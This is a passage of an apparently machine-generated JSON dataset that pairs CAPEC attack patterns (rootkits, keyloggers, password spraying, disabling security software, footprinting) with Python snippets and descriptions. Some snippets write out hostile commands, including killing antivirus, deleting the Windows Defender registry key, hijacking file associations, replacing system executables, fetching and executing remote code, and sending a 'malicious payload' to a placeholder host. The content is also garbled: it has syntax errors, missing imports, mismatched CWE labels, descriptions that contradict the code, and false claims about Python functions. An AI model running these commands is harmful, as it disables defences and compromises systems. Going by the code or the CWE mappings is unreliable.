        "description": "This Python code snippet demonstrates the CAPEC of modifying existing services by enabling a malicious service, adding a user to a malicious group, and starting the service with elevated privileges using an insecure method. The code also incorporates CWEs 284, 522, 1193, 15, and 908, showcasing improper access control, insufficiently protected credentials, power-on of untrusted execution core, external control of system settings, and use of uninitialized resources."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import os\nimport getpass\n\n# CWE-284: Improper Access Control\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n\nusername = getpass.getuser()\nif username == 'admin':\n    # CWE-497: Exposure of Sensitive System Information\n    system_info = os.popen('systeminfo').read()\n    print('System Information: ', system_info)\n\n    # CWE-78: OS Command Injection\n    cmd = 'net user ' + username + ' *'\n    os.system(cmd)\n    print('Password changed successfully!')\n\n    # Malicious code to hide system components\n    os.popen('attrib +h C:\\Windows\\System32\\calc.exe').read()\n    print('Calc.exe hidden successfully!')\n\nelse:\n    print('Access denied!')",
        "description": "This Python code snippet demonstrates a rootkit-like behavior by exploiting weaknesses in authentication and access control. It uses the getpass module to get the current username and checks if it's 'admin'. If true, it uses the os module to execute system commands, exposing sensitive system information and changing the user's password. It also hides the calc.exe file using the attrib command, demonstrating the ability to alter system components. This code embodies the main idea of the CAPEC, which is to exploit weaknesses in authentication to install malware that alters the functionality and information provided by targeted operating system API calls."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import os\n\ndef restricted_functionality():\n    # This function is supposed to be protected by a password\n    password = os.environ.get('PASSWORD')\n    if password == 'secret':\n        return 'Access granted'\n    else:\n        return 'Access denied'\n\n# Client-side enforcement of server-side security\npassword = input('Enter password: ')\nif password == 'secret':\n    os.environ['PASSWORD'] = password\n    result = restricted_functionality()\n    print(result)\nelse:\n    print('Access denied')",
        "description": "This code snippet demonstrates the CAPEC of bypassing protection mechanisms. The restricted_functionality function is supposed to be protected by a password, but the password check is done on the client-side. An attacker can bypass this protection by directly setting the PASSWORD environment variable, allowing them to access the restricted functionality without entering the correct password. This code embodies CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-424 (Improper Protection of Alternate Path), CWE-1299 (Missing Protection Mechanism for Alternate Hardware Interface), CWE-695 (Use of Low-Level Functionality), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import paramiko\n\nusername = 'admin'\npassword = 'password123'\n\nssh = paramiko.SSHClient()\nssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\nssh.connect('10.0.0.1', username=username, password=password)\nstdin, stdout, stderr = ssh.exec_command('whoami')\nprint(stdout.read().decode())\nssh.close()",
        "description": "This Python code snippet demonstrates a vulnerable remote access scenario using SSH with weak password requirements (CWE-521) and single-factor authentication (CWE-308). The code uses a hardcoded username and password to connect to a remote server, which is susceptible to unauthorized interception and retrieval (CWE-522). The code also lacks password aging mechanisms (CWE-262) and does not implement dual-factor authentication, making it vulnerable to capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-284: Improper Access Control\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-73: External Control of File Name or Path\n# CWE-64: Windows Shortcut Following (.LNK)\n# CWE-910: Use of Expired File Descriptor\n\ndef set_file_handler(file_extension, malicious_executable):\n    # Set the file handler for the given file extension to the malicious executable\n    ctypes.windll.shell32.SHChangeNotify(0, 0, 0, 0)\n    os.system(f'assoc {file_extension}={malicious_executable}')\n\n# Example usage:\nset_file_handler('.txt', 'malicious_exe.exe')",
        "description": "This Python code snippet demonstrates the CAPEC of modifying a file handler to call an arbitrary program when a file with a specific extension is opened. It uses the related CWEs to highlight the vulnerabilities: CWE-284 (Improper Access Control), CWE-646 (Reliance on File Name or Extension), CWE-73 (External Control of File Name or Path), CWE-64 (Windows Shortcut Following), and CWE-910 (Use of Expired File Descriptor). The code sets the file handler for a given file extension to a malicious executable, allowing an attacker to execute arbitrary code when a file with that extension is opened."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import hashlib\n\ndef store_data(data):\n    # CWE-477: Using obsolete function (md5)\n    hashed_data = hashlib.md5(data.encode()).hexdigest()\n    # CWE-218: Failure to provide confidentiality for stored data\n    # Storing data in plaintext\n    with open('data.txt', 'w') as f:\n        f.write(data)\n    # CWE-373: State Synchronization Error\n    # Lack of synchronization between threads\n    threads = []\n    for i in range(5):\n        t = threading.Thread(target=store_data, args=(data,))\n        threads.append(t)\n        t.start()\n    # CWE-1101: Reliance on Runtime Component in Generated Code\n    # Generated code relies on specific runtime support component (threading module)\n    # CWE-217: Failure to Protect Stored Data from Modification\n    # Data can be modified by other threads\n    return hashed_data\n",
        "description": "This code snippet demonstrates a deprecated CAPEC that incorporates multiple weaknesses. It uses an obsolete function (md5) to hash data, stores data in plaintext, lacks synchronization between threads, and relies on a specific runtime support component (threading module). The code also allows data to be modified by other threads, making it vulnerable to modification."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command\n\n# Assuming 'user_input' is a string from an untrusted source\nuser_input = \"malicious_command\"\n\n# CWE-114: Process Control\n# Executing commands from an untrusted source\nos.system(\"sudo rm /usr/bin/original_executable\")\nos.system(\"mv malicious_executable /usr/bin/original_executable\")\n\n# CWE-733 and CWE-1037: Compiler/Processor Optimization Removal or Modification of Security-critical Code\n# In this example, the compiler/processor optimization may remove or modify the security check\nif __debug__:\n    if os.access(\"/usr/bin/original_executable\", os.X_OK):\n        print(\"Executable is accessible\")\n    else:\n        print(\"Executable is not accessible\")",
        "description": "This Python code snippet demonstrates the CAPEC of replacing a trusted executable with a malicious version by exploiting weaknesses in privilege management and access control. It uses CWE-284 to bypass access control, CWE-78 to inject malicious OS commands, CWE-114 to execute commands from an untrusted source, and CWE-733 and CWE-1037 to potentially remove or modify security-critical code through compiler/processor optimization."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\nsatellite_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\ndef send_disruptive_signal(signal):\n    # CWE-927: Use of Implicit Intent for Sensitive Communication\n    # Using an implicit intent to send sensitive data\n    intent = {'action': 'disrupt_signal', 'data': signal}\n    satellite_socket.sendto(str(intent).encode(), ('satellite_ip', 8080))\n\n# CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n# Overlapping protected and unprotected regions\nprotected_region = 0x1000\nunprotected_region = 0x1000\n\n# Disruptive signal transmission\nwhile True:\n    signal = 'disruptive_signal'\n    send_disruptive_signal(signal)\n",
        "description": "Python code snippet demonstrating the CAPEC attack pattern, where an adversary sends disruptive signals to a target satellite using a rogue uplink station, disrupting intended transmission and affecting those within the satellite's footprint. The code incorporates CWEs 940, 923, 924, 927, and 1316, showcasing improper verification of source, restriction of communication channels, enforcement of message integrity, use of implicit intent, and overlapping protected and unprotected regions."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-522: Insufficiently Protected Credentials\n    # Storing passwords in plaintext\n    users = {'admin': 'password123', 'user': 'password456'}\n    if username in users and users[username] == password:\n        return True\n    return False\n\n\ndef login_attempts(username, password):\n    # CWE-307: Improper Restriction of Excessive Authentication Attempts\n    # No limit on authentication attempts\n    for _ in range(1000):\n        if authenticate(username, password):\n            return True\n    return False\n\n\ndef main():\n    username = input('Enter username: ')\n    password = input('Enter password: ')\n    if login_attempts(username, password):\n        print('Login successful!')\n    else:\n        print('Invalid credentials')\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates the CAPEC of using stolen or guessed credentials to gain unauthorized access. It uses CWE-522 by storing passwords in plaintext, CWE-307 by allowing unlimited login attempts, and CWE-308/CWE-309 by using single-factor authentication with passwords. The code also lacks password aging mechanisms (CWE-262/CWE-263) and relies on a single factor for authentication decisions (CWE-654)."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import getpass\nimport os\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-263: Password Aging with Long Expiration\n# CWE-262: Not Using Password Aging\n# CWE-521: Weak Password Requirements\n\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\n# Storing credentials in plaintext\ncredentials = {'username': username, 'password': password}\n\n# CWE-522: Credentials stored in plaintext\nwith open('credentials.txt', 'w') as f:\n    f.write(str(credentials))\n\n# CWE-308, CWE-309: Single-factor authentication using weak password\nif len(password) < 8:\n    print('Weak password!')\nelse:\n    print('Login successful!')\n\n# CWE-294: Capture-replay attack\n# (Assuming the server does not implement any security measures to prevent capture-replay attacks)\n\n# CWE-263, CWE-262: No password aging mechanism\n# CWE-521: Weak password requirements\n",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary guessing or obtaining legitimate Windows administrator credentials to access Windows Admin Shares. The code uses single-factor authentication with weak password requirements, stores credentials in plaintext, and lacks password aging mechanisms, making it vulnerable to various attacks."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\nshared_location = '/shared/content'\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\ndef upload_file(file):\n    with open(os.path.join(shared_location, file.filename), 'wb') as f:\n        f.write(file.file.read())\n\n# CWE-378: Creation of Temporary File With Insecure Permissions\ndef create_temp_file(file):\n    temp_file = os.path.join(shared_location, 'temp_' + file.filename)\n    with open(temp_file, 'wb') as f:\n        f.write(file.file.read())\n    return temp_file\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_and_execute_code(url):\n    import requests\n    code = requests.get(url).content\n    with open(os.path.join(shared_location, 'downloaded_code.py'), 'wb') as f:\n        f.write(code)\n    exec(compile(code, 'downloaded_code.py', 'exec'))\n\n# CWE-433: Unparsed Raw Web Content Delivery\nfrom http.server import SimpleHTTPRequestHandler, HTTPServer\n\nhttpd = HTTPServer(('localhost', 8000), SimpleHTTPRequestHandler)\nhttpd.serve_forever()",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary manipulating files in a shared location by adding malicious programs, scripts, or exploit code to valid content. The code allows unrestricted file uploads, creates temporary files with insecure permissions, downloads and executes code without integrity checks, and serves unparsed raw web content. This can lead to the execution of malicious code when a user opens the shared content."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-219: Storage of File with Sensitive Data Under Web Root\n# CWE-433: Unparsed Raw Web Content Delivery\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-494: Download of Code Without Integrity Check\n\ndef upload_file(file):\n    # Allow file upload without proper access control\n    if file.filename == \"\":\n        return \"No selected file\"\n    else:\n        # Store file under web document root with insufficient access control\n        file.save(os.path.join(\"/var/www/html/uploads\", file.filename))\n        return \"File uploaded successfully\"\n\n# Allow execution of uploaded file\ndef execute_file(file):\n    # Rely on file name or extension to determine appropriate behaviors\n    if file.filename.endswith(\".py\"):\n        # Execute the uploaded file without verifying origin and integrity\n        os.system(f\"python /var/www/html/uploads/{file.filename}\")\n        return \"File executed successfully\"\n    else:\n        return \"Invalid file type\"",
        "description": "This Python code snippet demonstrates a vulnerable file upload and execution functionality, embodying the main idea of the CAPEC. It lacks proper access control, stores sensitive data under the web document root, and relies on file name or extension to determine behaviors. The code also downloads and executes code without verifying its origin and integrity, making it vulnerable to attacks."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import os\nimport getpass\nimport socket\n\n# CWE-284: Improper Access Control\n# CWE-603: Use of Client-Side Authentication\nusername = 'admin'\npassword = 'hardcoded_password'\n\nif getpass.getuser() == username:\n    # CWE-520: .NET Misconfiguration: Use of Impersonation\n    # CWE-798: Use of Hard-coded Credentials\n    # CWE-259: Use of Hard-coded Password\n    impersonation_level = 'impersonate'\n    os.environ['username'] = username\n    os.environ['password'] = password\n    os.system('net use \\\\\\\\remote_share\\\\ipc$ ' + password + ' /user:' + username)\n    # Establish a connection to a remote server\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('remote_server', 8080))\n    # Send a malicious payload\n    sock.send(b' Malicious payload ')\n    sock.close()\n",
        "description": "This Python code snippet demonstrates the CAPEC of modifying logon scripts to maintain persistence or move laterally within an enclave. It uses hard-coded credentials and improper access control, allowing an adversary to bypass workstation and enclave firewalls. The code impersonates an admin user, establishes a connection to a remote server, and sends a malicious payload."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import time\n\n# List of common passwords\npasswords = ['password123', 'letmein', 'dragonball']\n\n# List of user accounts\nusers = ['user1', 'user2', 'user3', 'user4', 'user5']\n\n# Function to authenticate user\ndef authenticate(user, password):\n    # Simulate authentication process\n    if user == 'user1' and password == 'password123':\n        return True\n    elif user == 'user2' and password == 'letmein':\n        return True\n    elif user == 'user3' and password == 'dragonball':\n        return True\n    else:\n        return False\n\n# Password spraying attack\nfor password in passwords:\n    for user in users:\n        if authenticate(user, password):\n            print(f'Valid credentials found: {user}:{password}')\n            break\n    time.sleep(60) # wait for 1 minute to avoid lockout\n",
        "description": "This Python code snippet demonstrates a password spraying attack, where an attacker tries a small list of common passwords against a list of user accounts. The code does not implement strong password requirements, password aging, or account lockout policies, making it vulnerable to brute force attacks. The authenticate function simulates the authentication process, and the attacker waits for 1 minute between attempts to avoid inducing a lockout."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\npassword = 'mysecretpassword'\n\n# CWE-759: Using a one-way hash without a salt\nhash = hashlib.sha256(password.encode()).hexdigest()\nprint('Hash without salt:', hash)\n\n# CWE-760: Using a one-way hash with a predictable salt\nsalt = 'mypredictablesalt'\nhash_with_salt = hashlib.sha256((password + salt).encode()).hexdigest()\nprint('Hash with predictable salt:', hash_with_salt)\n",
        "description": "This code snippet demonstrates the deprecated CAPEC, which involves authentication bypass issues and failure to protect stored data. It uses CWE-759 and CWE-760 as examples, showcasing the insecure use of one-way hashes without salts and with predictable salts for password storage."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import getpass\nimport telnetlib\n\nHOST = '127.0.0.1'\nuser = input('Enter your telnet username: ')\npassword = getpass.getpass()\n\n# Using deprecated telnetlib which is prone to authentication bypass issues\n# CWE-592\ntry:\n    tn = telnetlib.Telnet(HOST)\n    tn.read_until(b'login: ')\n    tn.write(user.encode('ascii') + b'\\n')\n    tn.read_until(b'Password: ')\n    tn.write(password.encode('ascii') + b'\\n')\n    print(tn.read_all().decode('ascii'))\nexcept EOFError:\n    print('*** Connection closed by remote host ***')\n\n# CWE-477: Using obsolete function getpass.getpass() which is deprecated since Python 3.9\n# CWE-217/CWE-766/CWE-767: Failure to protect stored data from modification\n# CWE-218/CWE-493: Failure to provide confidentiality for stored data\n# CWE-247/CWE-350: Reliance on DNS Lookups in a security decision\n",
        "description": "This code snippet demonstrates a deprecated telnet client that uses obsolete functions and fails to protect stored data from modification, provide confidentiality for stored data, and relies on DNS lookups in a security decision, making it vulnerable to authentication bypass issues."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import getpass\nimport hashlib\nimport socket\n\n# Hard-coded credentials (CWE-798)\nusername = 'admin'\npassword = 'password123'\n\n# Weak password requirements (CWE-521)\ndef is_strong_password(password):\n    return len(password) > 5\n\nif is_strong_password(password):\n    # Store credentials insecurely (CWE-522)\n    credentials = {'username': username, 'password': password}\n    with open('credentials.txt', 'w') as f:\n        f.write(str(credentials))\n\n    # Capture-replay vulnerability (CWE-294)\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('localhost', 8080))\n    sock.sendall(str(credentials).encode())\n    sock.close()\n\n    # Keylogger (CAPEC)\n    import pynput\n    from pynput.keyboard import Key, Listener\n    def on_press(key):\n        try:\n            print('alphanumeric key {0} pressed'.format(key.char))\n        except AttributeError:\n            print('special key {0} pressed'.format(key))\n    def on_release(key):\n        print('{0} released'.format(key))\n        if key == Key.esc:\n            # Stop listener\n            return False\n    # Collecting events until released\n    with Listener(on_press=on_press, on_release=on_release) as listener:\n        listener.join()",
        "description": "This code snippet demonstrates a keylogger that captures user keystrokes, stores hard-coded credentials insecurely, and has weak password requirements. It also simulates a capture-replay vulnerability by sending the credentials over a socket."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import os\nimport getpass\nimport ctypes\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nusername = getpass.getuser()\nprint(f'Username: {username}')\n\n# CWE-214: Invocation of Process Using Visible Sensitive Information\npassword = input('Enter password: ')\nos.system(f'echo {password} > password.txt')\n\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nctypes.windll.kernel32.CreateFileW('password.txt:my_stream', 0, 0, None, 2, 0, None)\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nprint('Password: ', password)\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\nimport ctypes\nctypes.windll.shell32.ShellExecuteW(None, 'runas', 'cmd.exe', '/c', None, None)\n",
        "description": "This Python code snippet demonstrates the CAPEC of capturing user input to obtain sensitive information. It uses various CWEs to expose sensitive system information, invoke processes with visible sensitive information, improperly handle Windows alternate data streams, expose sensitive information to unauthorized actors, and misconfigure .NET impersonation. The code captures the username, password, and stores the password in a file with an alternate data stream. It then prints the password and escalates privileges using .NET impersonation."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import getpass\nimport socket\n\nusername = getpass.getuser()\nhostname = socket.gethostname()\n\n# CWE-592: Authentication Bypass Issues (DEPRECATED)\n# CWE-217: Failure to Protect Stored Data from Modification (DEPRECATED)\n# CWE-247: Reliance on DNS Lookups in a Security Decision (DEPRECATED)\n# CWE-477: Use of Obsolete Function\n# CWE-391: Unchecked Error Condition\n\ntry:\n    # Using an obsolete function (os.popen) to get the system's DNS resolution\n    dns_resolution = os.popen('nslookup ' + hostname).read()\n    # Ignoring exceptions and error conditions\n    if 'some_condition' in dns_resolution:\n        # Bypassing authentication using the deprecated getpass module\n        if username == 'admin':\n            print('Admin access granted!')\n        else:\n            print('Access denied!')\nexcept Exception as e:\n    # Ignoring the exception and continuing execution\n    pass",
        "description": "This code snippet demonstrates a deprecated CAPEC that combines multiple weaknesses. It uses an obsolete function (os.popen) to get the system's DNS resolution, ignores exceptions and error conditions, and bypasses authentication using the deprecated getpass module. This code is vulnerable to multiple attacks and should not be used in production."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "import logging\nimport os\nimport git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo()\ncommit = repo.head.commit\nprint(f'Commit: {commit.hexsha}')\n\n# CWE-532: Insertion of Sensitive Information into Log File\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\nlogging.debug(f'User credentials: username={os.environ['USER']}, password={os.environ['PASSWORD']}')\n\n# CWE-778: Insufficient Logging\ntry:\n    # Simulate a security-critical event\n    open('non_existent_file', 'r')\nexcept FileNotFoundError:\n    # Omit important details about the event when logging it\n    logging.error('An error occurred')\n\n# CWE-779: Logging of Excessive Data\nfor i in range(10000):\n    logging.info(f'Request {i} received')\n\n# CWE-294: Authentication Bypass by Capture-replay\n# Simulate capturing and replaying authentication data\nauth_data = {'username': 'admin', 'password': 'password'}\nprint(f'Replayed authentication data: {auth_data}')\n\n# CAPEC: Prevent host-generated logs from being delivered to a central location\n# Simulate log file tampering\nlog_file = 'app.log'\nwith open(log_file, 'w') as f:\n    f.write('')\nprint(f'Log file {log_file} has been tampered with')",
        "description": "This Python code snippet demonstrates the CAPEC of preventing host-generated logs from being delivered to a central location, incorporating related CWEs. It exposes a version control repository, logs sensitive information, omits important details from logs, logs excessive data, and simulates authentication bypass by capture-replay. Finally, it tampers with the log file to prevent it from being delivered to a central location."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "import os\nimport zipfile\nimport shutil\n\n# CWE-774: No limit on file descriptors\nfiles = []\nfor i in range(10000):\n    f = open(f\"file{i}.txt\", \"w+\")\n    files.append(f)\n\n# CWE-434: Unrestricted upload of file with dangerous type\ndangerous_file = \"malicious.exe\"\nshutil.copy(dangerous_file, \"/uploads/\")\n\n# CWE-646: Reliance on file name or extension\nuploaded_file = \"exploit.php.jpg\"\nif uploaded_file.endswith(\".jpg\"):\n    # process as image\n    pass\n\n# CWE-409: Improper handling of highly compressed data\nwith zipfile.ZipFile(\"exploit.zip\", \"w\") as zip:\n    zip.write(\"exploit.txt\")\n\n# CWE-69: Improper handling of Windows ::DATA alternate data stream\nads_file = \"exploit.txt:malicious_data\"\nwith open(ads_file, \"w+\") as f:\n    f.write(\"malicious data\")",
        "description": "This code snippet demonstrates the CAPEC of modifying file contents by adding data to files, which can lead to various attacks and outcomes. It includes vulnerabilities such as allocating file descriptors without limits (CWE-774), unrestricted upload of files with dangerous types (CWE-434), reliance on file name or extension (CWE-646), improper handling of highly compressed data (CWE-409), and improper handling of Windows ::DATA alternate data stream (CWE-69)."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "import psutil\n\n# Get a list of all running process\nprocesses = [(p.info['pid'], p.info['name'], p.info['username']) for p in psutil.process_iter(['pid', 'name', 'username'])]\n\n# Print the list of running processes\nfor process in processes:\n    print(f\"Process ID: {process[0]}, Process Name: {process[1]}, Username: {process[2]}\")",
        "description": "This Python code snippet uses the psutil library to get a list of all running processes on the system, including their process ID, name, and username. This information can be used by an adversary to learn about the target environment and potentially exploit it for further malicious behavior."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import subprocess\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# CWE-1229: Creation of Emergent Resource\n\ndef get_services_info():\n    # Using 'sc' command to get services information\n    sc_output = subprocess.check_output(['sc', 'query', 'type= service']).decode('utf-8')\n    # Using 'tasklist' command to get services information\n    tasklist_output = subprocess.check_output(['tasklist', '/svc']).decode('utf-8')\n    # Using 'net start' command to get services information\n    net_start_output = subprocess.check_output(['net', 'start']).decode('utf-8')\n    return sc_output + tasklist_output + net_start_output\n\nprint(get_services_info())",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting functionality to identify information about services on the target system. It uses the 'sc', 'tasklist', and 'net start' commands to gather sensitive system information, which can be used by an adversary to learn about the target environment and potentially exploit it further. The code embodies CWE-200, CWE-497, CWE-1249, CWE-214, and CWE-1229, as it exposes sensitive information to unauthorized actors, provides an inconsistent view of the underlying operating system, and creates emergent resources that can be used by attackers."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import subprocess\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1249: Application-Level Admin Tool with Inconsistent View of Underlying Operating System\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n\n# Get a list of all users on the system\nusers = subprocess.check_output(['net', 'user']).decode('utf-8').split('\\n')\n\n# Get a list of all groups on the system\ngroups = subprocess.check_output(['net', 'localgroup']).decode('utf-8').split('\\n')\n\n# Get a list of all permissions for each user\npermissions = {}\nfor user in users:\n    permissions[user] = subprocess.check_output(['icacls', user]).decode('utf-8').split('\\n')\n\n# Print the results in JSON format\nimport json\nprint(json.dumps({'users': users, 'groups': groups, 'permissions': permissions}))",
        "description": "This Python code snippet uses the 'net user' and 'net localgroup' commands to gather information about users and groups on the system, and the 'icacls' command to gather information about permissions for each user. The results are then printed in JSON format. This code embodies the CAPEC of exploiting functionality meant to identify information about domain accounts and their permissions on the target system, and relates to CWEs 200, 497, 1249, 529, and 214."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import subprocess\n\ndef get_local_groups():\n    try:\n        output = subprocess.check_output(['net', 'localgroup']).decode('utf-8').split('\\n')\n        groups = {}\n        for line in output:\n            if ':' in line:\n                group, members = line.strip().split(':')\n                groups[group.strip()] = [member.strip() for member in members.split(',')]\n        return groups\n    except Exception as e:\n        return str(e)\n\nprint(get_local_groups())",
        "description": "This Python code snippet uses the 'net localgroup' command to retrieve a list of local groups and their members on a Windows system. The output is a dictionary where the keys are the group names and the values are lists of members. This code embodies the CAPEC by exposing sensitive information about user groups and their permissions to an unauthorized actor, which can be used to inform further malicious behavior. The related CWEs are CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-842 (Placement of User into Incorrect Group), CWE-529 (Exposure of Access Control List Files to an Unauthorized Control Sphere), CWE-214 (Invocation of Process Using Visible Sensitive Information), and CWE-1229 (Creation of Emergent Resource)."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import os\nimport getpass\nimport json\n\nusername = getpass.getuser()\nuser_dir = f'C:\\Users\\{username}'\n\nsensitive_info = {}\n\nfor root, dirs, files in os.walk(user_dir):\n    for file in files:\n        if file == 'ntuser.dat':\n            file_path = os.path.join(root, file)\n            modified_time = os.path.getmtime(file_path)\n            sensitive_info[file] = modified_time\n\nprint(json.dumps(sensitive_info, indent=4))",
        "description": "This Python code snippet demonstrates the CAPEC by traversing the user directory to find the 'ntuser.dat' file, which contains sensitive information about the user's last login time. The code uses the 'os' and 'getpass' modules to access the user directory and retrieve the last modified time of the 'ntuser.dat' file. The sensitive information is then printed in JSON format, exposing it to potential unauthorized actors, as described in CWE-200. The code also invokes a process with visible sensitive information, as described in CWE-214, and creates a temporary file in a directory with insecure permissions, as described in CWE-379. Furthermore, the code exposes sensitive system information to an unauthorized control sphere, as described in CWE-497, and provides an inconsistent view of the underlying operating system, as described in CWE-1249."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "import os\nimport getpass\nimport logging\n\n# CWE-798: Hard-coded credentials\nusername = 'admin'\npassword = 'password123'\n\n# CWE-284: Improper Access Control\nif getpass.getuser() == username:\n    # CWE-671: Lack of Administrator Control over Security\n    logging.basicConfig(filename='app.log', level=logging.INFO)\n    logging.info('Application started')\n    \n    # CWE-1037 and CWE-733: Optimization Removal or Modification of Security-critical Code\n    try:\n        os.system('taskkill /im antivirus.exe')\n        os.system('reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\" /f')\n        os.system('del /q app.log')\n    except Exception as e:\n        logging.error(str(e))",
        "description": "This Python code snippet demonstrates the CAPEC of disabling security tools by exploiting weaknesses in access control. It uses hard-coded credentials to authenticate, lacks proper access control, and disables security features such as antivirus software and logging. The code also attempts to remove log files and registry keys, further compromising system security."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import os\nimport ctypes\nimport getpass\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-427: Uncontrolled Search Path Element\n# CWE-798: Use of Hard-coded Credentials\n\n# Hard-coded credentials\nusername = 'admin'\npassword = 'password123'\n\n# Uncontrolled search path element\npath = 'C:\\Windows\\System32\\' + username + '.dll'\n\n# Load DLL on startup using Winlogon\nctypes.windll.kernel32.LoadLibraryExW(path, 0, 0)\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# CWE-558: Use of getlogin() in Multithreaded Application\nimport threading\nimport getpass\n\ndef impersonate_user():\n    # Use getlogin() in multithreaded context\n    print(getpass.getuser())\n\n# Create a thread that impersonates the user\nthread = threading.Thread(target=impersonate_user)\nthread.start()",
        "description": "This Python code snippet demonstrates the CAPEC of loading a malicious DLL on startup using Winlogon in Windows systems prior to Windows Vista. It uses hard-coded credentials, uncontrolled search path elements, and .NET misconfiguration with impersonation. The code loads a DLL from a user-controlled path, allowing an adversary to load adversarial code at startup. Additionally, it uses getlogin() in a multithreaded context, which can return incorrect values."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "import time\nimport os\n\ndef check_file_exists(file_path):\n    start_time = time.time()\n    if os.path.exists(file_path):\n        return {'result': True, 'time_taken': time.time() - start_time}\n    else:\n        return {'result': False, 'time_taken': time.time() - start_time}\n\ndef check_admin_privileges):\n    try:\n        os.system('whoami > privileges.txt')\n        with open('privileges.txt', 'r') as f:\n            content = f.read()\n        if 'admin' in content:\n            return {'result': True, 'content': content}\n        else:\n            return {'result': False, 'content': content}\n    except Exception as e:\n        return {'result': False, 'error': str(e)}\n\n# Example usage:\nprint(check_file_exists('/etc/shadow'))\nprint(check_admin_privileges())",
